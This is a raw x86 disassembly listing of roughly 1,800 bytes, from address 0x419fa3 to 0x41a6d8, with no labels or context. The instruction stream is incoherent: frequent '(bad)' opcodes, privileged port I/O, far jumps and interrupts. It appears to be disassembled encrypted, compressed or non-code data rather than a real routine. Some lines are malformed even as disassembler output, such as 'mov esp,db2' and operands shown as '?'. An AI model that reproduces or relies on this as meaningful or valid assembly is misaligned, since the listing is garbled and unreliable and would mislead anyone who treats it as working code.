  419fa3:	arpl   sp,ax
  419fa5:	loop   0x41a000
  419fa7:	popa   
  419fa8:	mov    al,ds:0x3d673a5e
  419fad:	mov    ch,0x7b
  419faf:	adc    al,BYTE PTR [eax+ebp*1-0x1456ca13]
  419fb6:	push   ecx
  419fb7:	pushf  
  419fb8:	(bad)  
  419fb9:	xchg   edx,eax
  419fba:	xchg   esp,ebx
  419fbc:	jnp    0x419f40
  419fbe:	scas   al,BYTE PTR es:[edi]
  419fbf:	mov    edx,0x8be09c35
  419fc4:	cmp    eax,0xd02d00e3
  419fc9:	leave  
  419fca:	xor    ebx,DWORD PTR [edx-0x9]
  419fcd:	out    dx,eax
  419fce:	sbb    al,0x14
  419fd0:	xchg   BYTE PTR [esi-0x249074f1],cl
  419fd6:	call   0xb94c1fa9
  419fdb:	xchg   ebp,eax
  419fdc:	adc    dl,BYTE PTR [edx]
  419fde:	mov    eax,0xca656f45
  419fe3:	dec    esi
  419fe4:	mov    al,ds:0x4bc0b0c7
  419fe9:	add    BYTE PTR ss:[eax],dl
  419fec:	jno    0x41a04c
  419fee:	ss popf 
  419ff0:	pop    esp
  419ff1:	pop    edx
  419ff2:	pop    ebp
  419ff3:	lods   eax,DWORD PTR ds:[esi]
  419ff4:	sub    eax,0xad2f4c64
  419ff9:	cwde   
  419ffa:	cmp    eax,0xdfbd88ec
  419fff:	inc    ecx
  41a000:	mov    dl,0x84
  41a002:	out    0x8b,eax
  41a004:	sti    
  41a005:	xor    BYTE PTR [esi-0x17],al
  41a008:	aad    0x8d
  41a00a:	inc    esi
  41a00b:	mov    eax,0xb65bfae1
  41a010:	sbb    dh,BYTE PTR es:[esi-0x62]
  41a014:	pop    esp
  41a015:	inc    ebx
  41a016:	dec    edi
  41a017:	leave  
  41a018:	addr16 (bad) 
  41a01a:	dec    ecx
  41a01b:	xchg   ebx,eax
  41a01c:	xor    ebx,DWORD PTR [esi-0x74]
  41a01f:	clc    
  41a020:	ss cmp eax,0xd27d19f0
  41a026:	and    esp,ecx
  41a028:	sub    esp,edi
  41a02a:	enter  0x25d4,0xfd
  41a02e:	lahf   
  41a02f:	loop   0x41a027
  41a031:	fsubp  st(1),st
  41a033:	in     eax,dx
  41a034:	adc    edi,DWORD PTR ss:[edx+ecx*1-0x37]
  41a039:	pushf  
  41a03a:	mov    WORD PTR [esi],es
  41a03c:	and    esp,DWORD PTR [edx]
  41a03e:	cs mov edx,0xec11924
  41a044:	scas   eax,DWORD PTR es:[edi]
  41a045:	pop    ss
  41a046:	or     ah,BYTE PTR [edi+ecx*8]
  41a049:	ffree  st(1)
  41a04b:	xchg   edi,esp
  41a04d:	fisub  WORD PTR [edx]
  41a04f:	mov    eax,ds:0x34682a30
  41a054:	(bad)
  41a058:	jbe    0x41a027
  41a05a:	test   eax,0xe126768e
  41a05f:	push   esp
  41a060:	stos   DWORD PTR es:[edi],eax
  41a061:	test   eax,0xbb625dd7
  41a066:	jmp    DWORD PTR ds:0x3f759bec
  41a06c:	jle    0x41a04e
  41a06e:	dec    eax
  41a06f:	push   esp
  41a070:	scas   al,BYTE PTR es:[edi]
  41a071:	xor    eax,0x754f29c1
  41a076:	out    0xf1,eax
  41a078:	push   eax
  41a079:	sub    DWORD PTR [ecx-0x63b53ee8],edx
  41a07f:	pop    esp
  41a080:	mov    al,BYTE PTR [edx]
  41a082:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a083:	jbe    0x41a0d9
  41a085:	sbb    BYTE PTR [ebp+0x26],dh
  41a088:	push   edx
  41a089:	inc    edi
  41a08a:	xchg   edx,eax
  41a08b:	stos   DWORD PTR es:[edi],eax
  41a08c:	jae    0x41a095
  41a08e:	dec    esp
  41a08f:	jg     0x41a065
  41a091:	cmp    al,0xc
  41a093:	gs in  eax,dx
  41a095:	or     eax,0x6ff12229
  41a09a:	sbb    cl,BYTE PTR [ebp-0x52]
  41a09d:	xchg   esi,eax
  41a09e:	sub    al,0xb0
  41a0a0:	dec    esi
  41a0a1:	loope  0x41a0a5
  41a0a3:	dec    esp
  41a0a4:	je     0x41a0ff
  41a0a6:	mov    ds:0xf1c67b90,al
  41a0ab:	add    BYTE PTR [ebp-0x1c],bh
  41a0ae:	(bad)  [ebp-0x2e8500a8]
  41a0b4:	cli    
  41a0b5:	jmp    0x41a060
  41a0b7:	sbb    cl,ah
  41a0b9:	pop    edi
  41a0ba:	cmp    eax,0x46c0da61
  41a0bf:	xchg   esp,eax
  41a0c0:	jp     0x41a0ef
  41a0c2:	imul   edx,DWORD PTR [ecx],0x20
  41a0c5:	ret    
  41a0c6:	and    edi,DWORD PTR [ecx+ebx*8-0x4e]
  41a0ca:	push   esi
  41a0cb:	xchg   esp,eax
  41a0cc:	stos   BYTE PTR es:[edi],al
  41a0cd:	inc    edi
  41a0ce:	arpl   WORD PTR [ecx+0x10],ax
  41a0d1:	std    
  41a0d2:	loope  0x41a117
  41a0d4:	pop    ds
  41a0d5:	out    dx,al
  41a0d6:	pop    ss
  41a0d7:	popa   
  41a0d8:	loope  0x41a0cd
  41a0da:	ins    BYTE PTR es:[edi],dx
  41a0db:	jne    0x6bebb4f8
  41a0e1:	ins    BYTE PTR es:[edi],dx
  41a0e2:	jb     0x41a0fd
  41a0e4:	aad    0x9b
  41a0e6:	pop    esi
  41a0e7:	jmp    0x30c2:0x4190e7ca
  41a0ee:	or     ebp,DWORD PTR [esi]
  41a0f0:	push   0x37
  41a0f2:	dec    edx
  41a0f3:	mov    ebp,0xa9eba6d9
  41a0f8:	mov    edx,ebx
  41a0fa:	pop    ecx
  41a0fb:	lods   al,BYTE PTR ds:[esi]
  41a0fc:	and    eax,0xa3ccfc74
  41a101:	frstor [ebp-0x7ab5799e]
  41a107:	jg     0x41a149
  41a109:	push   ecx
  41a10a:	and    BYTE PTR [eax-0x28],0xf3
  41a10e:	pop    ebp
  41a10f:	arpl   WORD PTR [esi-0x35fd1f4b],bp
  41a115:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a116:	hlt    
  41a117:	mov    ds:0x82fa121c,eax
  41a11c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a11d:	mov    cl,0x46
  41a11f:	imul   ebx,DWORD PTR [eax-0x6e205d70],0xcc21fa4c
  41a129:	mov    edx,0xe26ddfed
  41a12e:	ret    0x98f8
  41a131:	xchg   DWORD PTR [ebx-0x4892b6ca],ecx
  41a137:	rcr    DWORD PTR [ebp-0x6a4e8bbe],cl
  41a13d:	or     ah,0xfe
  41a140:	and    eax,0x7a7dcbf7
  41a145:	cdq    
  41a146:	xor    BYTE PTR [edx],al
  41a148:	mov    bl,0xbf
  41a14a:	add    BYTE PTR [edx-0x5b],0x90
  41a14e:	cdq    
  41a14f:	retf   
  41a150:	xor    al,0xdf
  41a153:	mov    al,BYTE PTR [esi-0x5b2945b2]
  41a159:	jmp    0x38c686f8
  41a15e:	outs   dx,DWORD PTR ds:[esi]
  41a15f:	outs   dx,BYTE PTR ds:[esi]
  41a160:	sbb    BYTE PTR [edi+eax*8+0x6c],cl
  41a164:	xor    eax,DWORD PTR [ebx+0x6a8e98ab]
  41a16a:	jp     0x41a1be
  41a16c:	pop    es
  41a16d:	xchg   BYTE PTR [ecx],dl
  41a16f:	pop    ebx
  41a170:	lock add BYTE PTR [eax+0x55],bl
  41a174:	iret   
  41a175:	and    eax,DWORD PTR [eax+0x38]
  41a178:	pop    ecx
  41a179:	in     al,0x46
  41a17b:	push   eax
  41a17c:	cmp    DWORD PTR [esi-0x12842b70],ecx
  41a182:	fldenv [ecx-0x3a8d5ea2]
  41a188:	repz mov ch,0xc
  41a18b:	adc    al,0x6e
  41a18d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a18e:	mov    dl,0x67
  41a190:	mov    dl,0x51
  41a192:	xor    al,0x27
  41a194:	push   edi
  41a195:	call   0x846a:0x2766a850
  41a19c:	test   DWORD PTR [ecx],edx
  41a19e:	lods   eax,DWORD PTR ds:[esi]
  41a19f:	sub    cl,ch
  41a1a1:	sar    DWORD PTR [edi],1
  41a1a3:	sbb    esi,DWORD PTR [ebp-0x73]
  41a1a6:	fild   WORD PTR [edi+0x1eab4316]
  41a1ac:	stos   DWORD PTR es:[edi],eax
  41a1ad:	sub    ebp,DWORD PTR [ecx+0x7caf2a1f]
  41a1b3:	mov    al,0xf1
  41a1b5:	push   ss
  41a1b6:	mov    bl,0x77
  41a1b8:	inc    esi
  41a1b9:	add    al,0x59
  41a1bb:	jmp    0x467d:0x14199adc
  41a1c2:	pop    ss
  41a1c3:	out    0x4c,eax
  41a1c5:	lea    ecx,[ecx-0x30]
  41a1c8:	jmp    0x6689:0xd9904f3f
  41a1cf:	daa    
  41a1d0:	sub    bh,bl
  41a1d2:	inc    edx
  41a1d3:	push   esi
  41a1d4:	lods   eax,DWORD PTR ds:[esi]
  41a1d5:	(bad)  
  41a1d6:	cmp    bl,BYTE PTR [ecx+ebx*1]
  41a1d9:	pop    esp
  41a1da:	bound  eax,QWORD PTR [ebx+0x29]
  41a1dd:	sbb    ebx,DWORD PTR [ecx]
  41a1df:	sbb    bh,BYTE PTR [eax-0x71]
  41a1e2:	xor    eax,0xb8dfd8e1
  41a1e7:	or     dl,BYTE PTR gs:[ebp+0x61]
  41a1eb:	pop    esi
  41a1ec:	lods   al,BYTE PTR ds:[esi]
  41a1ed:	pushf  
  41a1ee:	xchg   DWORD PTR [ecx-0x604f8c18],esp
  41a1f4:	int3   
  41a1f5:	cmp    cl,0x5d
  41a1f8:	out    dx,eax
  41a1f9:	inc    esp
  41a1fa:	lods   eax,DWORD PTR ds:[esi]
  41a1fb:	inc    ebx
  41a1fc:	sub    al,0xa4
  41a1fe:	or     eax,0xaf65ed4b
  41a203:	mov    ds:0x9f15988,al
  41a208:	test   eax,0x68f39998
  41a20d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a20e:	mul    ch
  41a210:	sub    DWORD PTR [ecx],ecx
  41a212:	push   edx
  41a213:	adc    al,0xa
  41a215:	lds    edx,FWORD PTR [esi+0x55]
  41a218:	ins    DWORD PTR es:[edi],dx
  41a219:	arpl   ax,dx
  41a21b:	mov    WORD PTR [edx],es
  41a21d:	scas   al,BYTE PTR es:[edi]
  41a21e:	lock gs xchg esp,eax
  41a221:	sbb    DWORD PTR [ecx+0x4e],edx
  41a224:	cmp    dh,ah
  41a226:	dec    edx
  41a227:	jg     0x41a24f
  41a229:	add    BYTE PTR fs:[esi],bh
  41a22c:	xchg   BYTE PTR ds:0xde8a8492,al
  41a232:	sub    bl,BYTE PTR [eax]
  41a234:	mov    WORD PTR [eax-0x223b81aa],?
  41a23a:	js     0x41a24b
  41a23c:	xchg   edi,eax
  41a23d:	adc    ch,ch
  41a23f:	sub    BYTE PTR [edx-0x3e4c3636],dh
  41a245:	into   
  41a246:	mov    al,0x72
  41a248:	div    BYTE PTR [ebx]
  41a24a:	std    
  41a24b:	sub    bl,bl
  41a24d:	icebp  
  41a24e:	cmp    eax,0x8e3d78cf
  41a253:	inc    edx
  41a254:	popf   
  41a255:	cli    
  41a256:	popf   
  41a257:	arpl   WORD PTR [ebp+0x36],ax
  41a25a:	fimul  DWORD PTR [ebx+esi*8]
  41a25d:	gs inc ebx
  41a25f:	idiv   DWORD PTR [edx+eax*4+0x53313cc8]
  41a266:	jmp    DWORD PTR [ecx-0x67042c76]
  41a26c:	mov    cl,ah
  41a26e:	sub    ebp,DWORD PTR [ebp+0x52]
  41a271:	or     ecx,DWORD PTR [ebx-0x6536a41]
  41a277:	pop    ds
  41a278:	jns    0x41a2d7
  41a27a:	dec    ebp
  41a27b:	lahf   
  41a27c:	out    0xd6,eax
  41a27e:	es pop eax
  41a280:	(bad)  
  41a281:	imul   ebx,esp,0x1b8095c1
  41a287:	fmul   QWORD PTR [edx+0x348c0a88]
  41a28d:	sar    BYTE PTR [edi],cl
  41a28f:	mov    ch,0xcf
  41a291:	out    0x5b,al
  41a293:	(bad)  
  41a296:	fwait
  41a297:	mov    eax,0x116cf011
  41a29c:	pop    ss
  41a29d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a29e:	push   esi
  41a29f:	mov    bh,0x69
  41a2a1:	dec    ecx
  41a2a2:	scas   eax,DWORD PTR es:[edi]
  41a2a3:	(bad)  
  41a2a4:	imul   edi,eax,0x930b6265
  41a2aa:	mov    esp,0x505ad18c
  41a2af:	scas   al,BYTE PTR es:[edi]
  41a2b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a2b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a2b2:	scas   eax,DWORD PTR es:[edi]
  41a2b3:	cwde   
  41a2b4:	iret   
  41a2b5:	and    BYTE PTR [eax-0x749901c3],0x17
  41a2bc:	fcmovb st,st(5)
  41a2be:	hlt    
  41a2bf:	lock inc edi
  41a2c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2c2:	inc    esp
  41a2c3:	loop   0x41a2c9
  41a2c5:	mov    dl,0xa3
  41a2c7:	js     0x41a301
  41a2c9:	mov    al,0x67
  41a2cb:	adc    DWORD PTR [edi],0x3cc5d970
  41a2d1:	dec    ecx
  41a2d2:	std    
  41a2d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2d4:	cmp    DWORD PTR [ebx-0x3735ca81],edi
  41a2da:	mov    al,0x57
  41a2dc:	out    0x6d,al
  41a2de:	mov    ebp,0x99a82055
  41a2e3:	pop    eax
  41a2e4:	mov    eax,ds:0x45ed7190
  41a2e9:	jmp    0x41a300
  41a2eb:	mov    edi,0xbbbf51d0
  41a2f0:	lds    esp,FWORD PTR [edx]
  41a2f2:	scas   al,BYTE PTR es:[edi]
  41a2f3:	xchg   BYTE PTR [edx],dh
  41a2f5:	mov    dl,0xf4
  41a2f7:	xor    edi,ebp
  41a2f9:	cli    
  41a2fa:	pop    esi
  41a2fb:	popa   
  41a2fc:	addr16 out 0xfc,eax
  41a2ff:	ror    DWORD PTR cs:[ecx],1
  41a302:	pop    ds
  41a303:	lock add edx,ecx
  41a306:	fist   WORD PTR [edi]
  41a308:	fidiv  DWORD PTR [ebp+0x63d13626]
  41a30e:	(bad)  
  41a30f:	pop    edx
  41a310:	inc    esi
  41a311:	xor    al,0x6b
  41a313:	arpl   sp,bx
  41a315:	jnp    0x41a2d8
  41a317:	out    dx,eax
  41a318:	mov    edi,edi
  41a31a:	dec    ebx
  41a31b:	int3   
  41a31c:	ja     0x41a337
  41a31e:	push   0xa6828ed4
  41a323:	jno    0x41a2e5
  41a325:	and    ch,BYTE PTR [edx-0x57]
  41a328:	jo     0x41a31d
  41a32a:	jbe    0x41a338
  41a32c:	call   0x5b2a:0xc8ccff8c
  41a333:	(bad)  
  41a334:	or     al,0xfc
  41a336:	xor    ecx,0x6f
  41a339:	pop    edi
  41a33a:	int    0x1e
  41a33c:	(bad)  
  41a33d:	fsubr  st,st(0)
  41a33f:	dec    ecx
  41a340:	mov    ebp,0x229cc02e
  41a345:	xlat   BYTE PTR ds:[ebx]
  41a346:	adc    esi,ebp
  41a348:	jge    0x41a352
  41a34a:	scas   al,BYTE PTR es:[edi]
  41a34b:	jp     0x41a341
  41a34d:	in     eax,0x1b
  41a34f:	inc    ebx
  41a350:	int    0x78
  41a352:	sub    BYTE PTR [edi+0xa],0xe5
  41a356:	test   BYTE PTR [ebx+0x55b7300b],dl
  41a35c:	push   ebp
  41a35d:	dec    edi
  41a35e:	pop    esi
  41a35f:	pop    edi
  41a360:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a361:	(bad)  
  41a362:	call   0xb5720449
  41a367:	fmul   st(5),st
  41a369:	clc    
  41a36a:	cmp    edx,esi
  41a36c:	out    dx,al
  41a36d:	int3   
  41a36e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a36f:	(bad)  
  41a370:	sub    eax,0x6df825e0
  41a375:	mov    DWORD PTR [esi+eiz*2-0x61c1ce20],ecx
  41a37c:	mov    ah,0x4e
  41a37e:	jp     0x41a36d
  41a380:	inc    eax
  41a381:	call   0x11b8f9ef
  41a386:	cmp    ebp,edx
  41a388:	inc    eax
  41a389:	mov    dl,0xf0
  41a38b:	fnsave [edx-0x67987acc]
  41a391:	bound  edx,QWORD PTR [edi+0x18]
  41a394:	push   eax
  41a395:	(bad)  
  41a396:	clc    
  41a397:	mov    al,ds:0xcd06c9de
  41a39c:	inc    edi
  41a39d:	aaa    
  41a39e:	inc    edi
  41a39f:	mov    ebx,ebx
  41a3a1:	cdq    
  41a3a2:	icebp  
  41a3a3:	fcomi  st,st(0)
  41a3a5:	push   cs
  41a3a6:	sti    
  41a3a7:	rcl    BYTE PTR [ebx+0xabf968d],0x49
  41a3ae:	jnp    0x41a412
  41a3b0:	mov    WORD PTR [ecx],fs
  41a3b2:	sbb    BYTE PTR [ecx+0x46ff1de],ah
  41a3b8:	push   ebp
  41a3b9:	test   al,0xa
  41a3bb:	dec    ecx
  41a3bc:	mov    ch,0xce
  41a3be:	loopne 0x41a434
  41a3c0:	dec    esi
  41a3c1:	adc    DWORD PTR [edx-0x20],esi
  41a3c4:	cld    
  41a3c5:	push   ebp
  41a3c6:	jp     0x41a43f
  41a3c8:	aad    0xd8
  41a3ca:	(bad)  
  41a3cb:	mov    ebp,0x6eb2593a
  41a3d0:	sbb    BYTE PTR [ebp+0x1565ebc2],ah
  41a3d6:	lock in eax,dx
  41a3d8:	lea    eax,[esi-0x17]
  41a3db:	imul   ebx,DWORD PTR [esi-0x4d],0xece503ed
  41a3e2:	test   eax,0x65369b8e
  41a3e7:	xor    BYTE PTR [esi+0x1fa07c3c],bh
  41a3ed:	xchg   ecx,eax
  41a3ee:	sub    edi,ecx
  41a3f0:	fld    DWORD PTR ds:0xd5f69da8
  41a3f6:	ja     0x41a445
  41a3f8:	inc    ebp
  41a3f9:	ss cs lahf 
  41a3fc:	jbe    0x41a421
  41a3fe:	xor    ah,0x95
  41a401:	jl     0x41a3ec
  41a403:	jno    0x41a46f
  41a405:	fdivr  DWORD PTR [ecx]
  41a407:	cmp    DWORD PTR [eax],esp
  41a409:	std    
  41a40a:	retf   0x1701
  41a40d:	test   esi,edx
  41a40f:	pop    esp
  41a410:	ins    BYTE PTR es:[edi],dx
  41a411:	adc    DWORD PTR [eax+0x3e],edx
  41a414:	(bad)  
  41a415:	and    DWORD PTR [esi-0x5413b832],ecx
  41a41b:	(bad)  
  41a41c:	adc    eax,0x9ba5d510
  41a421:	mov    esi,0x3b8c19c2
  41a426:	xor    BYTE PTR [eax],al
  41a428:	fnsave [esi-0x5539fb23]
  41a42e:	push   ebx
  41a42f:	mov    al,0xce
  41a431:	mov    al,ds:0x5d436221
  41a436:	and    edi,ebp
  41a438:	test   al,0xdc
  41a43a:	mov    al,ds:0x1f91f254
  41a43f:	fldcw  WORD PTR [ecx+eax*8]
  41a442:	ror    DWORD PTR [ecx+0x6b],cl
  41a445:	ret    
  41a446:	sti    
  41a447:	sbb    DWORD PTR [ecx+0x61b98f87],eax
  41a44d:	inc    ebx
  41a44e:	arpl   WORD PTR [ecx+ecx*8+0x1cdd858e],ax
  41a455:	retf   0xc20
  41a458:	scas   al,BYTE PTR es:[edi]
  41a459:	das    
  41a45a:	aam    0xe9
  41a45c:	mov    eax,0x1a7f0272
  41a461:	or     al,0xde
  41a463:	sub    DWORD PTR [edx+eiz*4-0x34],ebx
  41a467:	in     al,0x5d
  41a469:	shr    BYTE PTR [eax-0xec867cf],0x7c
  41a470:	mov    ecx,0xada9465b
  41a475:	adc    ah,cl
  41a477:	retf   
  41a478:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a479:	pop    edx
  41a47a:	jmp    0x1e21:0x9991b3f2
  41a481:	and    eax,0xe96c517b
  41a486:	cli    
  41a487:	jo     0x41a4b8
  41a489:	div    DWORD PTR [esi-0x8079285]
  41a48f:	pop    esi
  41a490:	add    ebx,DWORD PTR [edx-0x33066892]
  41a496:	repz jecxz 0x41a484
  41a499:	jl     0x41a43f
  41a49b:	inc    ebx
  41a49c:	pop    es
  41a49d:	jno    0x41a46e
  41a49f:	mov    eax,0x5cf5df7f
  41a4a4:	arpl   WORD PTR [edx+edi*4+0x9fdb1c6],cx
  41a4ab:	mov    cl,0x40
  41a4ad:	sahf   
  41a4ae:	adc    DWORD PTR [edi],ebp
  41a4b0:	pusha  
  41a4b1:	mov    ch,0xf5
  41a4b3:	mov    ecx,0xe6bde67
  41a4b8:	xchg   edi,eax
  41a4b9:	int3   
  41a4ba:	cmp    eax,0xdb6a542c
  41a4bf:	xchg   esi,eax
  41a4c0:	pop    ebp
  41a4c1:	test   al,0xc0
  41a4c3:	inc    ecx
  41a4c4:	jnp    0x41a4b7
  41a4c6:	mov    ds:0x22e2be0a,al
  41a4cb:	mov    ?,WORD PTR [ebx]
  41a4cd:	sbb    BYTE PTR [eax+0xc],0x7b
  41a4d1:	mov    ds,WORD PTR [edi]
  41a4d3:	adc    DWORD PTR [edi-0x1976e53d],eax
  41a4d9:	pop    ecx
  41a4da:	xlat   BYTE PTR ds:[ebx]
  41a4db:	int    0xcf
  41a4dd:	das    
  41a4de:	jmp    0x41a54b
  41a4e0:	mov    ebx,0x331c9595
  41a4e5:	push   ss
  41a4e6:	sbb    edi,ebx
  41a4e8:	into   
  41a4e9:	sar    DWORD PTR [ebp-0x6da37d10],1
  41a4ef:	inc    ebx
  41a4f0:	inc    eax
  41a4f1:	mov    al,ds:0xf375d763
  41a4f6:	outs   dx,BYTE PTR ds:[esi]
  41a4f7:	sub    DWORD PTR [ecx],eax
  41a4f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a4fa:	mov    fs,WORD PTR [ecx*8-0x51d24b79]
  41a501:	jae    0x41a558
  41a503:	xchg   edi,eax
  41a504:	pop    edx
  41a505:	sub    edi,DWORD PTR [esi]
  41a507:	jnp    0x41a4dc
  41a509:	push   esp
  41a50a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a50b:	sub    DWORD PTR [esi+0x4b],esi
  41a50e:	loope  0x41a4b7
  41a510:	xchg   ebp,eax
  41a511:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a512:	mov    ah,0x12
  41a514:	popa   
  41a515:	or     DWORD PTR [eax-0x3ea5ef97],esp
  41a51b:	xchg   esp,eax
  41a51c:	pop    ds
  41a51d:	jns    0x41a4f1
  41a51f:	push   ds
  41a520:	jmp    0x41a525
  41a522:	push   eax
  41a523:	push   0xffffff8b
  41a525:	cmp    al,0x36
  41a527:	pop    esp
  41a528:	cmp    BYTE PTR [edi+0x5d830eff],ah
  41a52e:	jns    0x41a518
  41a530:	and    ecx,edx
  41a532:	mov    eax,ds:0xa34c0a3
  41a537:	jge    0x41a4db
  41a539:	dec    ecx
  41a53a:	sub    DWORD PTR [edx-0x2c],edx
  41a53d:	sub    eax,0xacd63c7
  41a542:	push   eax
  41a543:	push   0xffffffea
  41a545:	retf   0x3f2f
  41a548:	add    eax,0x7a14b1d4
  41a54d:	adc    BYTE PTR [ecx-0x7c],cl
  41a550:	arpl   WORD PTR cs:[ebp-0x5bdf7b40],bx
  41a557:	jae    0x41a4e2
  41a559:	and    ecx,DWORD PTR [eax+0x6f]
  41a55c:	sub    cl,ah
  41a55e:	arpl   sp,dx
  41a560:	mov    bh,0x46
  41a562:	mov    DWORD PTR [eax],ebp
  41a564:	sub    eax,0xb87caa02
  41a569:	mov    ds:0x1af6b552,eax
  41a56e:	push   ds
  41a56f:	mov    ebx,0x35d8bbbb
  41a574:	ja     0x41a5a1
  41a576:	xor    bl,al
  41a578:	enter  0xefce,0x4e
  41a57c:	adc    al,0x11
  41a57e:	mov    ah,0x55
  41a580:	sbb    eax,0x22e1ec1c
  41a585:	ja     0x41a573
  41a587:	fisttp DWORD PTR [edi+edi*4]
  41a58a:	pop    edi
  41a58b:	pop    ss
  41a58c:	(bad)  
  41a58d:	outs   dx,DWORD PTR ds:[esi]
  41a58e:	dec    ecx
  41a58f:	leave  
  41a590:	shr    DWORD PTR ds:0x9afc643f,1
  41a596:	ins    DWORD PTR es:[edi],dx
  41a597:	fwait
  41a598:	inc    ecx
  41a599:	jl     0x41a5a4
  41a59b:	loopne 0x41a613
  41a59d:	in     eax,dx
  41a59e:	xor    al,0x6b
  41a5a0:	mov    ebx,0x89fcade
  41a5a5:	mov    esi,DWORD PTR [edi-0x3064fd85]
  41a5ab:	sar    DWORD PTR [ebx+0x217b4ece],0x3a
  41a5b2:	dec    esi
  41a5b3:	sahf   
  41a5b4:	dec    edi
  41a5b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a5b6:	(bad)  
  41a5b7:	test   al,0xed
  41a5b9:	jno    0x41a5ab
  41a5bb:	sbb    BYTE PTR [edi+0x53],cl
  41a5be:	aam    0x8a
  41a5c0:	mov    ch,0x28
  41a5c2:	xor    eax,0xb15a4a15
  41a5c7:	push   cs
  41a5c8:	xchg   DWORD PTR [edi+0x4e],edi
  41a5cb:	adc    cl,BYTE PTR [ebx+0x5b]
  41a5ce:	inc    esp
  41a5cf:	sbb    bl,al
  41a5d1:	cmp    al,0x5d
  41a5d3:	push   edx
  41a5d4:	add    DWORD PTR [edx+ebx*2+0x78],edi
  41a5d8:	push   edi
  41a5d9:	js     0x41a5df
  41a5db:	jo     0x41a57a
  41a5dd:	sub    bh,BYTE PTR [edx]
  41a5df:	jecxz  0x41a5f3
  41a5e1:	ror    DWORD PTR [edx-0x58bb6e7b],0xa5
  41a5e8:	push   ss
  41a5e9:	aas    
  41a5ea:	jnp    0x41a631
  41a5ec:	push   eax
  41a5ed:	dec    edx
  41a5ee:	and    dh,bl
  41a5f0:	cli    
  41a5f1:	shl    DWORD PTR [eax-0x1ddb3291],0xdd
  41a5f8:	push   cs
  41a5f9:	fwait
  41a5fa:	dec    edx
  41a5fb:	jne    0x41a5ea
  41a5fd:	add    BYTE PTR [esi+0xef25287],0x45
  41a604:	std    
  41a605:	ret    
  41a606:	xchg   esp,eax
  41a607:	cmp    al,BYTE PTR [eax]
  41a609:	mov    ebp,0x66b72d5
  41a60e:	dec    esi
  41a60f:	push   eax
  41a610:	out    dx,al
  41a611:	jg     0x41a5b2
  41a613:	and    eax,0x70dc5b52
  41a618:	std    
  41a619:	jl     0x41a5ae
  41a61b:	mov    esi,0x42dcf026
  41a620:	push   ss
  41a621:	lea    ecx,[esi-0x40]
  41a624:	add    bh,BYTE PTR [ebx-0x5e]
  41a627:	dec    ebx
  41a628:	test   eax,0x5b1acbd0
  41a62d:	ins    DWORD PTR es:[edi],dx
  41a62e:	jge    0x41a5e7
  41a630:	inc    eax
  41a631:	aaa    
  41a632:	push   ebp
  41a633:	out    dx,eax
  41a634:	and    bl,cl
  41a636:	int3   
  41a637:	dec    ebx
  41a638:	cs daa 
  41a63a:	sub    al,0x69
  41a63c:	xlat   BYTE PTR ds:[ebx]
  41a63d:	sub    DWORD PTR [esi+0x20ce91cf],edx
  41a643:	sub    DWORD PTR [esi],0x68
  41a646:	ficomp WORD PTR [ecx+0x724f2621]
  41a64c:	lods   eax,DWORD PTR ds:[esi]
  41a64d:	ja     0x41a5ed
  41a64f:	outs   dx,DWORD PTR ds:[esi]
  41a650:	inc    ebp
  41a651:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a652:	lds    esp,FWORD PTR [ecx]
  41a654:	dec    esi
  41a655:	mov    al,ds:0x7250e3a1
  41a65a:	and    bh,bh
  41a65c:	mov    al,0xd5
  41a65e:	ja     0x41a5fd
  41a660:	pop    esp
  41a661:	in     eax,dx
  41a662:	mov    bh,0x82
  41a664:	popa   
  41a665:	test   eax,0x931455d9
  41a66a:	mov    esp,db2
  41a66d:	xor    bh,BYTE PTR [ebx]
  41a66f:	in     al,dx
  41a670:	pop    edi
  41a671:	and    ah,BYTE PTR [eax]
  41a673:	inc    ebp
  41a674:	shl    DWORD PTR [eax],1
  41a676:	std    
  41a677:	cmp    eax,0x82afe53
  41a67c:	int3   
  41a67d:	xor    BYTE PTR [ebx+0x3e],dh
  41a680:	dec    esp
  41a681:	ins    BYTE PTR es:[edi],dx
  41a682:	mov    al,ds:0x9b78b443
  41a687:	cmc    
  41a688:	in     eax,dx
  41a689:	sub    eax,0x7577519d
  41a68e:	xchg   esp,eax
  41a68f:	rcl    ch,cl
  41a691:	mov    al,0xb7
  41a693:	inc    eax
  41a694:	(bad)  
  41a695:	sbb    edi,DWORD PTR [eax]
  41a697:	adc    al,0x26
  41a699:	(bad)  
  41a69a:	dec    edi
  41a69b:	scas   al,BYTE PTR es:[edi]
  41a69c:	loopne 0x41a693
  41a69e:	add    ch,dh
  41a6a0:	mov    ch,dl
  41a6a2:	jnp    0x41a63b
  41a6a4:	xor    esi,edi
  41a6a6:	add    eax,0xf2330827
  41a6ab:	(bad)  [edi]
  41a6ad:	jmp    0x41a637
  41a6af:	aaa    
  41a6b0:	in     eax,0x71
  41a6b2:	mov    eax,0x13bd0b10
  41a6b7:	jg     0x41a648
  41a6b9:	nop
  41a6ba:	shl    DWORD PTR [ebx+ebp*1],0xc3
  41a6be:	cdq    
  41a6bf:	es (bad) 
  41a6c1:	(bad)  
  41a6c2:	int3   
  41a6c3:	fs pop ss
  41a6c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a6c6:	shr    bh,cl
  41a6c8:	push   es
  41a6c9:	pop    esp
  41a6ca:	cmp    DWORD PTR [eax+ebx*4-0x677a8079],esi
  41a6d1:	hlt    
  41a6d2:	repnz or al,dl
  41a6d5:	jo     0x41a72e
  41a6d7:	dec    edx
  41a6d8:	stc    
